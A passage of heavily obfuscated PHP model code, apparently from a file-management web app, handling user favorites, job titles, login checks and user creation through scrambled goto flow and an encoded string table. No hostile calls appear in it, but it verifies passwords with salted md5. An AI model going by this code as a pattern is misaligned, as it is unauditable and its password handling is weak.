!empty($aÁ÷Î æÇµ)) { $this->options = array_merge($this->options, array_change_key_case($aÁ÷Î æÇµ)); } return $this; } public function where($f‡Û­Şœï, $cº¡µ¸‚ Ÿ = null) { $Eé¥ºØï°î =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_null($cº¡µ¸‚ Ÿ) && is_string($f‡Û­Şœï)) { if (!is_array($cº¡µ¸‚ Ÿ)) { $cº¡µ¸‚ Ÿ = func_get_args(); array_shift($cº¡µ¸‚ Ÿ); } $cº¡µ¸‚ Ÿ = array_map(array($this->db, $Eé¥ºØï°î[328]), $cº¡µ¸‚ Ÿ); $f‡Û­Şœï = vsprintf($f‡Û­Şœï, $cº¡µ¸‚ Ÿ); } elseif (is_object($f‡Û­Şœï)) { $f‡Û­Şœï = get_object_vars($f‡Û­Şœï); } if (is_string($f‡Û­Şœï) && $Eé¥ºØï°î[33] != $f‡Û­Şœï) { $d¡øĞÎ×Æ = array(); $d¡øĞÎ×Æ[$Eé¥ºØï°î[335]] = $f‡Û­Şœï; $f‡Û­Şœï = $d¡øĞÎ×Æ; } if (isset($this->options[$Eé¥ºØï°î[260]])) { $this->options[$Eé¥ºØï°î[260]] = array_merge($this->options[$Eé¥ºØï°î[260]], $f‡Û­Şœï); } else { $this->options[$Eé¥ºØï°î[260]] = $f‡Û­Şœï; } return $this; } public function limit($CŸ±ÄÒ”¤¼, $dø–Âëß‘ñ = null) { $eªÍâ˜©ŒÃ =& $_SERVER[÷ÖêïÔÔÓ]; $this->options[$eªÍâ˜©ŒÃ[277]] = is_null($dø–Âëß‘ñ) ? $CŸ±ÄÒ”¤¼ : $CŸ±ÄÒ”¤¼ . $eªÍâ˜©ŒÃ[47] . $dø–Âëß‘ñ; return $this; } public function page($B½øğ†Ÿ¨, $c…Ğá¿êß’ = null) { $e›ÕÈˆôñ =& $_SERVER[÷ÖêïÔÔÓ]; $this->options[$e›ÕÈˆôñ[336]] = is_null($c…Ğá¿êß’) ? $B½øğ†Ÿ¨ : $B½øğ†Ÿ¨ . $e›ÕÈˆôñ[47] . $c…Ğá¿êß’; return $this; } public function comment($C¿××†éèè) { $this->options[$_SERVER[÷ÖêïÔÔÓ][337]] = $C¿××†éèè; return $this; } public function setProperty($EÒÎ½æğâ¼, $b«‰ÓÈà·µ) { if (property_exists($this, $EÒÎ½æğâ¼)) { $this->{$EÒÎ½æğâ¼} = $b«‰ÓÈà·µ; } return $this; } } goto f¬ù•–µ†; aÁ¾£°Ù˜: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($dÔ¯©«óšÛ) { $b•ÑŒÏõÀÛ =& $_SERVER[÷ÖêïÔÔÓ]; return array($b•ÑŒÏõÀÛ[2358] => array(USER_ID, $b•ÑŒÏõÀÛ[2359])); } protected function listData() { $Eêïâ¸¥Û =& $_SERVER[÷ÖêïÔÔÓ]; $e´­•äô±” = array($Eêïâ¸¥Û[1332] => USER_ID, $Eêïâ¸¥Û[432] => 0); $eÈš‰é‹ÊÑ = $Eêïâ¸¥Û[2360]; $Fß´Ğ¥ÏŸÊ = $this->field($eÈš‰é‹ÊÑ)->where($e´­•äô±”)->order($Eêïâ¸¥Û[2361])->select(); return $Fß´Ğ¥ÏŸÊ ? $Fß´Ğ¥ÏŸÊ : array(); } protected function resetCache() { } protected function listView() { goto dÒ†îÙë; dÒ†îÙë: $e¦è’·ªæ» =& $_SERVER[÷ÖêïÔÔÓ]; $eÕ¢œ˜»Àí = $this->listData(); $EÃÂâ’ÃÁá = array_filter_by_field($eÕ¢œ˜»Àí, $e¦è’·ªæ»[29], $e¦è’·ªæ»[379]); goto CÇªè»ùÓ™; d¯Ìš¹¬: $e´£Š‡á‚ = array($e¦è’·ªæ»[380] => array($e¦è’·ªæ»[381], $CŒ­¶…ÀÍ‹)); $aà®à‰ŠØ• = Model($e¦è’·ªæ»[748])->listSource($e´£Š‡á‚, $aŠİªÆ™¹); $aà®à‰ŠØ• = array_merge($aà®à‰ŠØ•[$e¦è’·ªæ»[74]], $aà®à‰ŠØ•[$e¦è’·ªæ»[75]]); goto AÍó´ôš; AÍó´ôš: $aà®à‰ŠØ• = array_to_keyvalue($aà®à‰ŠØ•, $e¦è’·ªæ»[366]); foreach ($eÕ¢œ˜»Àí as $Cäé‰§ÆË¼ => $a¦«öç´ø¯) { $BÏ£ëºêÏ = $aà®à‰ŠØ•[$a¦«öç´ø¯[$e¦è’·ªæ»[76]]]; $BÏ£ëºêÏ = $BÏ£ëºêÏ ? $BÏ£ëºêÏ : array(); $eÕ¢œ˜»Àí[$Cäé‰§ÆË¼] = array_merge($BÏ£ëºêÏ, $a¦«öç´ø¯); } return $eÕ¢œ˜»Àí; goto C§‘’Š„¡«; CÇªè»ùÓ™: $CŒ­¶…ÀÍ‹ = array_to_keyvalue($EÃÂâ’ÃÁá, $e¦è’·ªæ»[33], $e¦è’·ªæ»[76]); if (!$CŒ­¶…ÀÍ‹) { return $eÕ¢œ˜»Àí; } $aŠİªÆ™¹ = 2000; goto d¯Ìš¹¬; C§‘’Š„¡«: } protected function addFav($E³¢´Š—ÒŒ, $A‚…ÛÉÅÃ‰ = '', $aõ£ªÛêƒ¨ = "\163\x6f\x75\162\x63\145") { goto C¬›—»™°å; C¬›—»™°å: $cáÂàºÈÍã =& $_SERVER[÷ÖêïÔÔÓ]; $cœŸ—®ôî = array($cáÂàºÈÍã[1332] => USER_ID, $cáÂàºÈÍã[432] => 0, $cáÂàºÈÍã[385] => $aõ£ªÛêƒ¨, $cáÂàºÈÍã[384] => $E³¢´Š—ÒŒ); if ($this->where($cœŸ—®ôî)->find()) { return !1; } goto C‹Ş¾ª…‚”; C‹Ş¾ª…‚”: $cœŸ—®ôî = array($cáÂàºÈÍã[1332] => USER_ID, $cáÂàºÈÍã[432] => 0); $bŸñ†ïë¤• = $this->where($cœŸ—®ôî)->max($cáÂàºÈÍã[2025]); if (!$bŸñ†ïë¤•) { $bŸñ†ïë¤• = 0; } goto AšòˆÚÚ¿; AšòˆÚÚ¿: if (!$A‚…ÛÉÅÃ‰ && $aõ£ªÛêƒ¨ == $cáÂàºÈÍã[379]) { $f“ÆÕ±ÚÇ = Model($cáÂàºÈÍã[1077])->where(array($cáÂàºÈÍã[380] => $E³¢´Š—ÒŒ))->find(); if (!$f“ÆÕ±ÚÇ) { return !1; } $A‚…ÛÉÅÃ‰ = $f“ÆÕ±ÚÇ[$cáÂàºÈÍã[28]]; } $A‚…ÛÉÅÃ‰ = $this->getAutoName($A‚…ÛÉÅÃ‰); $AŒ ½Ä‰çİ = array($cáÂàºÈÍã[1332] => USER_ID, $cáÂàºÈÍã[432] => 0, $cáÂàºÈÍã[383] => $A‚…ÛÉÅÃ‰, $cáÂàºÈÍã[384] => $E³¢´Š—ÒŒ, $cáÂàºÈÍã[385] => $aõ£ªÛêƒ¨, $cáÂàºÈÍã[2008] => $bŸñ†ïë¤• + 1); goto dÆùˆ‹ç¾‚; dÆùˆ‹ç¾‚: return $this->add($AŒ ½Ä‰çİ); goto C„¢æ§ŞïŠ; C„¢æ§ŞïŠ: } protected function remove($b’À†Á‚õŠ) { $E‡äŠÛŸ’¨ =& $_SERVER[÷ÖêïÔÔÓ]; $fç¢áæÒ¨Ç = array($E‡äŠÛŸ’¨[1332] => USER_ID, $E‡äŠÛŸ’¨[382] => $b’À†Á‚õŠ); return $this->where($fç¢áæÒ¨Ç)->delete(); } protected function removeByName($E™ÉÊë×Üœ) { $dĞ™ÁÙ‡â’ =& $_SERVER[÷ÖêïÔÔÓ]; $BÙ­”÷ªÏĞ = array($dĞ™ÁÙ‡â’[1332] => USER_ID, $dĞ™ÁÙ‡â’[383] => $E™ÉÊë×Üœ, $dĞ™ÁÙ‡â’[432] => 0); return $this->where($BÙ­”÷ªÏĞ)->delete(); } protected function rename($BéèãçÉªÚ, $a´•ÕùŸÎ¾) { $DŸ¥Ä»ïä„ =& $_SERVER[÷ÖêïÔÔÓ]; if ($BéèãçÉªÚ == $a´•ÕùŸÎ¾) { return !1; } $aóİ¿œáÑÕ = $this->getAutoName($a´•ÕùŸÎ¾); if ($a´•ÕùŸÎ¾ != $aóİ¿œáÑÕ) { return !1; } $aÖ›È©» = array($DŸ¥Ä»ïä„[1332] => USER_ID, $DŸ¥Ä»ïä„[432] => 0, $DŸ¥Ä»ïä„[28] => $BéèãçÉªÚ); return $this->where($aÖ›È©»)->save(array($DŸ¥Ä»ïä„[28] => $a´•ÕùŸÎ¾)); } protected function resetSort($aÊ³ñáÅõø) { $BŒç×î—¥× =& $_SERVER[÷ÖêïÔÔÓ]; $fæÅÚ° ôà = array($BŒç×î—¥×[1332] => USER_ID); for ($Bƒó’ğÁˆä = 0; $Bƒó’ğÁˆä < count($aÊ³ñáÅõø); $Bƒó’ğÁˆä++) { $fæÅÚ° ôà[$BŒç×î—¥×[382]] = $aÊ³ñáÅõø[$Bƒó’ğÁˆä]; $this->where($fæÅÚ° ôà)->save(array($BŒç×î—¥×[2008] => $Bƒó’ğÁˆä + 1)); } return !0; } protected function moveTop($d Š¶ÅÉäµ) { goto E£™¨å‡˜À; d‚Š…Ëã‚: return $this->resetSort($EßèŒœ£½å); goto DÈöÉ°æ‚°; F‰ÓƒÎÖ‡…: $b‹«Ø—ÊêÏ = $EßèŒœ£½å; $EßèŒœ£½å = array_remove_value($EßèŒœ£½å, $d”£÷¶º´á[$FŞ†ñ×›å¿[364]]); array_unshift($EßèŒœ£½å, $d”£÷¶º´á[$FŞ†ñ×›å¿[364]]); goto d‚Š…Ëã‚; DÊñ›À‡ƒ: if (!$d”£÷¶º´á) { return; } $EßèŒœ£½å = $this->field($FŞ†ñ×›å¿[364])->where($B¹¥ÛÎ†°)->order($FŞ†ñ×›å¿[2361])->select(); $EßèŒœ£½å = array_to_keyvalue($EßèŒœ£½å, $FŞ†ñ×›å¿[33], $FŞ†ñ×›å¿[364]); goto F‰ÓƒÎÖ‡…; E£™¨å‡˜À: $FŞ†ñ×›å¿ =& $_SERVER[÷ÖêïÔÔÓ]; $B¹¥ÛÎ†° = array($FŞ†ñ×›å¿[1332] => USER_ID, $FŞ†ñ×›å¿[432] => 0); $d”£÷¶º´á = $this->where($B¹¥ÛÎ†°)->where(array($FŞ†ñ×›å¿[28] => $d Š¶ÅÉäµ))->find(); goto DÊñ›À‡ƒ; DÈöÉ°æ‚°: } protected function moveBottom($cÊÖ«Î–Ùº) { $aÃ¥Ôªå» =& $_SERVER[÷ÖêïÔÔÓ]; $d®·¸ÒøÓ› = array($aÃ¥Ôªå»[1332] => USER_ID, $aÃ¥Ôªå»[432] => 0); $e¬¼ÇÄÜƒò = $this->where($d®·¸ÒøÓ›)->max($aÃ¥Ôªå»[2025]); $Cå¼Œ½ßÇå = array($aÃ¥Ôªå»[2025] => $e¬¼ÇÄÜƒò + 1); return $this->where($d®·¸ÒøÓ›)->where(array($aÃ¥Ôªå»[28] => $cÊÖ«Î–Ùº))->save($Cå¼Œ½ßÇå); } private function getAutoName($C©Á÷†‚¹) { goto bñéŞ¼Šƒˆ; bñéŞ¼Šƒˆ: $a‰Áœç„ =& $_SERVER[÷ÖêïÔÔÓ]; $DÆ·ãÃ¤‹ = array($a‰Áœç„[1332] => USER_ID, $a‰Áœç„[432] => 0); $d¹³ùí˜Ì = $this->field($a‰Áœç„[28])->where($DÆ·ãÃ¤‹)->select(); goto e®‘Ô†˜Œ; C™„èì³‹š: return $C©Á÷†‚¹ . "\50{$D¶˜Üï—ç÷}\x29"; goto F«®™à„; e®‘Ô†˜Œ: $d¹³ùí˜Ì = array_to_keyvalue($d¹³ùí˜Ì, $a‰Áœç„[33], $a‰Áœç„[28]); if (!$d¹³ùí˜Ì || !in_array($C©Á÷†‚¹, $d¹³ùí˜Ì)) { return $C©Á÷†‚¹; } for ($D¶˜Üï—ç÷ = 0; $D¶˜Üï—ç÷ < count($d¹³ùí˜Ì); $D¶˜Üï—ç÷++) { if (!in_array($C©Á÷†‚¹ . "\50{$D¶˜Üï—ç÷}\x29", $d¹³ùí˜Ì)) { return $C©Á÷†‚¹ . "\x28{$D¶˜Üï—ç÷}\x29"; } } goto C™„èì³‹š; F«®™à„: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\144\x65\x73\143", "\x73\157\x72\x74"); const JOB_KEY = "\x73\145\154\x66\112\157\142\114\x69\163\x74"; public function listData($BŒ»Š®¯£• = false, $d“ªÁ¼©Öà = "\x73\x6f\x72\x74", $CÄªç‚µ†ê = false) { return parent::listData($BŒ»Š®¯£•, $d“ªÁ¼©Öà, $CÄªç‚µ†ê); } public function remove($FŠ’ÎâŠÔ) { return parent::remove($FŠ’ÎâŠÔ); } public function add($B¤Û¤§ÂÎõ) { $C ³í™„“Ï =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->findByName($B¤Û¤§ÂÎõ[$C ³í™„“Ï[28]])) { return !1; } $B¤Û¤§ÂÎõ[$C ³í™„“Ï[2025]] = $this->getSort(); return parent::insert($B¤Û¤§ÂÎõ); } private function getSort() { $Cê´Ë£ì§ =& $_SERVER[÷ÖêïÔÔÓ]; $EÎÃÓ¬·Ôù = parent::listData(); $BãùÎÅœåà = array_to_keyvalue($EÎÃÓ¬·Ôù, $Cê´Ë£ì§[33], $Cê´Ë£ì§[2025]); return empty($BãùÎÅœåà) ? 0 : max($BãùÎÅœåà) + 1; } public function update($f â¸»ÔØÇ, $A‘½…í¦òÀ) { $bšœßùË† =& $_SERVER[÷ÖêïÔÔÓ]; $E¤ÁƒŒ‚™ = parent::listData($f â¸»ÔØÇ); $cÃ­Ç¼ÍĞÕ = $this->findByName($A‘½…í¦òÀ[$bšœßùË†[28]]); if (!$E¤ÁƒŒ‚™ || $cÃ­Ç¼ÍĞÕ && $cÃ­Ç¼ÍĞÕ[$bšœßùË†[364]] != $E¤ÁƒŒ‚™[$bšœßùË†[364]]) { return !1; } return parent::update($f â¸»ÔØÇ, $A‘½…í¦òÀ); } public function setUserJob($DˆÖÅË•®, $A±Ù¶ ³¯) { goto bÄœÓš‚…; E…ô§Šì¼: $dß¿Â³”ë = rtrim($dß¿Â³”ë, $cíÅ´‹Õä[47]); Model($cíÅ´‹Õä[469])->metaSet($DˆÖÅË•®, self::JOB_KEY, $dß¿Â³”ë); goto F»ŒĞˆ¿ä; bÄœÓš‚…: $cíÅ´‹Õä =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_array($A±Ù¶ ³¯)) { $A±Ù¶ ³¯ = array($A±Ù¶ ³¯); } $fîËÂñæ‚¤ = parent::listData(); goto A„Â‡ãÆÊ; A„Â‡ãÆÊ: $D„áÖĞì = array_to_keyvalue($fîËÂñæ‚¤, $cíÅ´‹Õä[28]); $dß¿Â³”ë = $cíÅ´‹Õä[358]; foreach ($A±Ù¶ ³¯ as $e”ÙâŠ‰é¸) { if ($D„áÖĞì[$e”ÙâŠ‰é¸]) { $dß¿Â³”ë .= $D„áÖĞì[$e”ÙâŠ‰é¸][$cíÅ´‹Õä[364]] . $cíÅ´‹Õä[47]; } else { $AÙÜÔƒ¡˜Ñ = $this->add($e”ÙâŠ‰é¸); $dß¿Â³”ë .= $AÙÜÔƒ¡˜Ñ . $cíÅ´‹Õä[47]; } } goto E…ô§Šì¼; F»ŒĞˆ¿ä: } public function getUserJob($bÃ¾äĞÜ›) { $aöÈğƒÑ¡ï = Model($_SERVER[÷ÖêïÔÔÓ][469])->metaGet($bÃ¾äĞÜ›); return $this->getUserJobInfo($aöÈğƒÑ¡ï[self::JOB_KEY]); } public function getUserJobInfo($c—˜ˆ´ƒÕ) { goto DÍ†ùÄÀëÙ; eµĞøÄ‡ó§: return $EÛ“Œ¢œİ‚; goto cĞÆæƒ¿ĞÅ; C§™ŠÅÆâ¯: $A–âá†¨—‰ = array_remove_key($A–âá†¨—‰, $Fƒ‚çŠõË™[184]); $EÛ“Œ¢œİ‚ = array(); foreach ($bÖ¼’‘Ñ‰Í as $B£ĞšĞø™) { if (isset($A–âá†¨—‰[$B£ĞšĞø™])) { $EÛ“Œ¢œİ‚[] = $A–âá†¨—‰[$B£ĞšĞø™]; } } goto eµĞøÄ‡ó§; DÍ†ùÄÀëÙ: $Fƒ‚çŠõË™ =& $_SERVER[÷ÖêïÔÔÓ]; $bÖ¼’‘Ñ‰Í = explode($Fƒ‚çŠõË™[47], $c—˜ˆ´ƒÕ); $A–âá†¨—‰ = parent::listData(); goto C§™ŠÅÆâ¯; cĞÆæƒ¿ĞÅ: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\x6d\x65" => "\165\163\145\x72\137\155\x65\164\x61", "\155\145\x74\141\x46\151\145\x6c\x64" => "\x75\163\145\162\x49\x44"); protected $simpleField = "\165\x73\x65\x72\x49\x44\x2c\x6e\151\143\x6b\116\x61\x6d\x65\x2c\x6e\x61\155\x65\54\141\x76\141\164\x61\162\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($A¯íŒ©‘„) { $E¸†”÷†—‘ =& $_SERVER[÷ÖêïÔÔÓ]; return array($E¸†”÷†—‘[2072] => array($A¯íŒ©‘„[0], $E¸†”÷†—‘[2362]), $E¸†”÷†—‘[2074] => array($A¯íŒ©‘„[0], $E¸†”÷†—‘[2362])); } protected function getInfo($D‰ˆâ©à, $cÚçâšÂÙª = false) { $aå¦¾ î” =& $_SERVER[÷ÖêïÔÔÓ]; $eÛê™¯‡‘Ñ = $this->getInfoSimple($D‰ˆâ©à); if (!is_array($eÛê™¯‡‘Ñ)) { return array(); } if ($cÚçâšÂÙª) { goto Dô¹äæ—ÃÄ; e²ØéŞ‘›: return $eÛê™¯‡‘Ñ; goto AÖÂËÌæ·×; Dô¹äæ—ÃÄ: if (!$eÛê™¯‡‘Ñ) { return $eÛê™¯‡‘Ñ; } $e‡²êÌÑƒ = md5($aå¦¾ î”[2363] . $eÛê™¯‡‘Ñ[$aå¦¾ î”[797]] . $aå¦¾ î”[2364] . $eÛê™¯‡‘Ñ[$aå¦¾ î”[28]]); $eÛê™¯‡‘Ñ = $this->_listDataApplyItem($eÛê™¯‡‘Ñ); goto Eã­å£øïß; Eã­å£øïß: $d—­Â—è–ì = Model($aå¦¾ î”[1077])->metaGet($eÛê™¯‡‘Ñ[$aå¦¾ î”[388]][$aå¦¾ î”[366]]); $eÛê™¯‡‘Ñ[$aå¦¾ î”[2365]] = $e‡²êÌÑƒ; $eÛê™¯‡‘Ñ[$aå¦¾ î”[388]][$aå¦¾ î”[2220]] = isset($d—­Â—è–ì[$aå¦¾ î”[2221]]) ? $d—­Â—è–ì[$aå¦¾ î”[2221]] : null; goto e²ØéŞ‘›; AÖÂËÌæ·×: } return $this->cacheFunctionGet($aå¦¾ î”[2115], $D‰ˆâ©à); } protected function getInfoSimple($A†ãŒåŞËº, $f«öİˆ›˜ = false) { $C‰ÜÚº¤•ã =& $_SERVER[÷ÖêïÔÔÓ]; if (!$A†ãŒåŞËº) { return array(); } if ($f«öİˆ›˜) { $b©¯ÕªÃ¿ = $this->where(array($C‰ÜÚº¤•ã[1341] => intval($A†ãŒåŞËº)))->find(); if (!is_array($b©¯ÕªÃ¿)) { return array(); } $b©¯ÕªÃ¿[$C‰ÜÚº¤•ã[2366]] = Action($C‰ÜÚº¤•ã[2367])->parseUrl($b©¯ÕªÃ¿[$C‰ÜÚº¤•ã[2366]]); return $b©¯ÕªÃ¿; } return $this->cacheFunctionGet($C‰ÜÚº¤•ã[2075], $A†ãŒåŞËº); } protected function getInfoSimpleOuter($aƒåÅ¸Á‡§) { goto Dİ¨‚èİÍ; Dİ¨‚èİÍ: $aÏˆæ–Õ¾Ñ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$aƒåÅ¸Á‡§ || $aƒåÅ¸Á‡§ == 0) { return array($aÏˆæ–Õ¾Ñ[1341] => $aÏˆæ–Õ¾Ñ[464], $aÏˆæ–Õ¾Ñ[28] => $aÏˆæ–Õ¾Ñ[154] . LNG($aÏˆæ–Õ¾Ñ[2368]) . $aÏˆæ–Õ¾Ñ[468], $aÏˆæ–Õ¾Ñ[2366] => STATIC_PATH . $aÏˆæ–Õ¾Ñ[2369]); } $CËò—Ù¡—Ù = $this->cacheFunctionGet($aÏˆæ–Õ¾Ñ[2075], $aƒåÅ¸Á‡§); goto Eãİòí¿¨; b¾ÁÓÜÍĞˆ: return $dìÄ•÷ó‘å; goto bòƒÆ¿—†ë; Eãİòí¿¨: $dìÄ•÷ó‘å = array_field_key($CËò—Ù¡—Ù, explode($aÏˆæ–Õ¾Ñ[47], $this->simpleField)); if (!$dìÄ•÷ó‘å) { return array($aÏˆæ–Õ¾Ñ[1341] => $aÏˆæ–Õ¾Ñ[1005], $aÏˆæ–Õ¾Ñ[28] => $aÏˆæ–Õ¾Ñ[154] . LNG($aÏˆæ–Õ¾Ñ[2370]) . $aÏˆæ–Õ¾Ñ[468], $aÏˆæ–Õ¾Ñ[2366] => STATIC_PATH . $aÏˆæ–Õ¾Ñ[2371]); } $dìÄ•÷ó‘å[$aÏˆæ–Õ¾Ñ[2366]] = Action($aÏˆæ–Õ¾Ñ[2367])->parseUrl($dìÄ•÷ó‘å[$aÏˆæ–Õ¾Ñ[2366]]); goto b¾ÁÓÜÍĞˆ; bòƒÆ¿—†ë: } protected function groupUser($E¸‚·Ê·±») { } public static function errorLang($B¡æ‹İÒ) { $dÁÛÜŞÀˆ =& $_SERVER[÷ÖêïÔÔÓ]; $côùá¢Ò²Á = array(self::ERROR_USER_NOT_EXISTS => $dÁÛÜŞÀˆ[2372], self::ERROR_USER_PASSWORD_ERROR => $dÁÛÜŞÀˆ[2373], self::ERROR_USER_EXIST_NAME => $dÁÛÜŞÀˆ[2374], self::ERROR_USER_EXIST_PHONE => $dÁÛÜŞÀˆ[2375], self::ERROR_USER_EXIST_EMAIL => $dÁÛÜŞÀˆ[2376], self::ERROR_USER_LOGIN_LOCK => $dÁÛÜŞÀˆ[2377], self::ERROR_IP_NOT_ALLOW => $dÁÛÜŞÀˆ[2378], self::ERROR_USER_EXIST_NICKNAME => $dÁÛÜŞÀˆ[2379]); return LNG($côùá¢Ò²Á[$B¡æ‹İÒ]); } public function getInfoByMeta($c¹ó§¯–Ëó, $CÌÌóÓÉ) { $b¤µÛà§Å =& $_SERVER[÷ÖêïÔÔÓ]; $C§ĞÕ”ù‡– = Model($b¤µÛà§Å[2380])->where(array($b¤µÛà§Å[88] => $c¹ó§¯–Ëó, $b¤µÛà§Å[354] => $CÌÌóÓÉ))->find(); if ($C§ĞÕ”ù‡–) { return $this->getInfo($C§ĞÕ”ù‡–[$b¤µÛà§Å[1341]]); } return !1; } public function userLoginCheck($CÙ¢Œ³õ•¯, $eÛÀ·«âİî) { goto FëÍ§¾îèò; FëÍ§¾îèò: $Dø¶ˆ³ß… =& $_SERVER[÷ÖêïÔÔÓ]; $dâÖñº¾§• = array($Dø¶ˆ³ß…[28] => $CÙ¢Œ³õ•¯, $Dø¶ˆ³ß…[2224] => $CÙ¢Œ³õ•¯, $Dø¶ˆ³ß…[290] => $CÙ¢Œ³õ•¯, $Dø¶ˆ³ß…[2381] => $CÙ¢Œ³õ•¯, $Dø¶ˆ³ß…[910] => $Dø¶ˆ³ß…[912]); if ($this->nickNameRpt()) { unset($dâÖñº¾§•[$Dø¶ˆ³ß…[2224]]); } goto dˆ…ÃØªƒè; b£ù¶óÒ‚İ: $this->userEdit($e„ø¬ÌÙš[$Dø¶ˆ³ß…[1341]], array($Dø¶ˆ³ß…[2382] => time())); $this->clearCache($e„ø¬ÌÙš[$Dø¶ˆ³ß…[1341]]); return $this->getInfo($e„ø¬ÌÙš[$Dø¶ˆ³ß…[1341]]); goto C´ù±•á²; dˆ…ÃØªƒè: $e„ø¬ÌÙš = $this->where($dâÖñº¾§•)->find(); if (!$e„ø¬ÌÙš) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e„ø¬ÌÙš[$Dø¶ˆ³ß…[1341]], $eÛÀ·«âİî)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto b£ù¶óÒ‚İ; C´ù±•á²: } public function clearCache($a”ÜÊáÀ‘î) { $d›¬ô‰å­ =& $_SERVER[÷ÖêïÔÔÓ]; $this->cacheFunctionClear($d›¬ô‰å­[2115], $a”ÜÊáÀ‘î); $this->cacheFunctionClear($d›¬ô‰å­[2075], $a”ÜÊáÀ‘î); } public function userPasswordCheck($eé¦†è¬„Ø, $FÛ¿¦Øœ¢ô) { $f‘—ÚÙ¯Ûï =& $_SERVER[÷ÖêïÔÔÓ]; $E˜‹¾µÎ¤« = $this->where(array($f‘—ÚÙ¯Ûï[1341] => intval($eé¦†è¬„Ø)))->find(); $B¡¾‰ÈÜ„æ = $this->metaGet($eé¦†è¬„Ø); $bµ…å¨¥Öö = isset($B¡¾‰ÈÜ„æ[$f‘—ÚÙ¯Ûï[2383]]) ? $B¡¾‰ÈÜ„æ[$f‘—ÚÙ¯Ûï[2383]] : $f‘—ÚÙ¯Ûï[33]; if (md5($bµ…å¨¥Öö . trim($FÛ¿¦Øœ¢ô)) !== $E˜‹¾µÎ¤«[$f‘—ÚÙ¯Ûï[797]]) { return !1; } return !0; } public function userAdd($AÊ±¶¯±Øá) { goto bÎ‰ÏÜ¿¤ó; aîÆª¼Œ: $e¹ùäËæ…¨ = $this->_checkExist($AÊ±¶¯±Øá); if ($e¹ùäËæ…¨ !== !0) { return $e¹ùäËæ…¨; } $c………‹í“ = $this->add($AŠø«‚ÄğÓ); goto cµŠ…±¶ç¼; F–‡«‘¾İ‰: return $c………‹í“; goto AÆÃ…„¦ñ; cµŠ…±¶ç¼: $cÍ¨„­²Û’ = array($eÏ¢¨¿‡®ï[2392] => $AŠø«‚ÄğÓ[$eÏ¢¨¿‡®ï[797]], $eÏ¢¨¿‡®ï[2388] => $AŠø«‚ÄğÓ[$eÏ¢¨¿‡®ï[2224]]); $this->userEdit($c………‹í“, $cÍ¨„­²Û’); Model($eÏ¢¨¿‡®ï[1077])->userRootAdd($c………‹í“); goto F–‡«‘¾İ‰; bÎ‰ÏÜ¿¤ó: $eÏ¢¨¿‡®ï =& $_SERVER[÷ÖêïÔÔÓ]; $AŠø«‚ÄğÓ = array($eÏ¢¨¿‡®ï[383] => $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[28]], $eÏ¢¨¿‡®ï[2384] => $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2385]], $eÏ¢¨¿‡®ï[2386] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[290]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[290]] : $eÏ¢¨¿‡®ï[33], $eÏ¢¨¿‡®ï[2387] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2381]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2381]] : $eÏ¢¨¿‡®ï[33], $eÏ¢¨¿‡®ï[2388] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2224]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2224]] : $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[28]], $eÏ¢¨¿‡®ï[2389] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2366]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2366]] : $eÏ¢¨¿‡®ï[33], $eÏ¢¨¿‡®ï[2390] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2391]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[2391]] : 1, $eÏ¢¨¿‡®ï[2392] => $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[797]], $eÏ¢¨¿‡®ï[2077] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[1988]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[1988]] : 1024 * 1024 * 20, $eÏ¢¨¿‡®ï[2078] => 0, $eÏ¢¨¿‡®ï[2382] => 0, $eÏ¢¨¿‡®ï[2102] => isset($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[675]]) ? $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[675]] : 1); if (!empty($AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[1341]])) { $AŠø«‚ÄğÓ[$eÏ¢¨¿‡®ï[1341]] = $AÊ±¶¯±Øá[$eÏ¢¨¿‡®ï[1341]]; } goto aîÆª¼Œ; AÆÃ…„¦ñ: } protected function userEditTest($cÔ –¿¬¼Œ, $aõå…‡Øó™) { return $this->call($_SERVER[÷ÖêïÔÔÓ][2393], $cÔ –¿¬¼Œ, $aõå…‡Øó™); } protected function userEdit($eºñİ­Ç…, $Dö“öÜÓ´ ) { goto a‚Îô …å‰; DÜß¸æ¿Ø: $B æ©‡Ê­… = $this->_checkExist($Dö“öÜÓ´ , $eºñİ­Ç…); if ($B æ©‡Ê­… !== !0) { return $B æ©‡Ê­…; } if (isset($Dö“öÜÓ´ [$CÑ°ó¼‰Üá[797]]) && trim($Dö“öÜÓ´ [$CÑ°ó¼‰Üá[797]]) != $CÑ°ó¼‰Üá[33]) { 